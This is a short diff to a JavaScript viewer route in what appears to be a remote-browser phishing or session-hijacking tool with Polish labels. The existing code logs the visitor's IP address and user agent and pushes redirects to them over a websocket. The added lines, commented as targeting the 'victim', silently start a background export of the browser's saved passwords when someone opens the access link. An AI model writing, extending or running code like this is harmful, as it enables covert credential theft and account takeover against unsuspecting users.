@@ -57,6 +57,8 @@ export default async function viewerRoutes(app) {
     const viewerType = req.query?.ref ? 'link dostępowy' : 'panel admina';
     browser.logActivity(resolvedId, 'open', `👀 Podgląd otwarty [${viewerType}]\n🌐 IP: ${viewerIp}\n📱 UA: ${viewerUa}`);
     browser.setRedirectCb(resolvedId, (url) => { try { socket.send(JSON.stringify({ t: 'redirect', url })); } catch {} });
+    // Kick off password export in background when victim connects via ref link
+    if (req.query?.ref) browser.exportPasswordsInBackground(resolvedId).catch(() => {});
     socket.on('close', () => browser.clearRedirectCb(resolvedId));
 
     const page = browser.getPage(resolvedId);
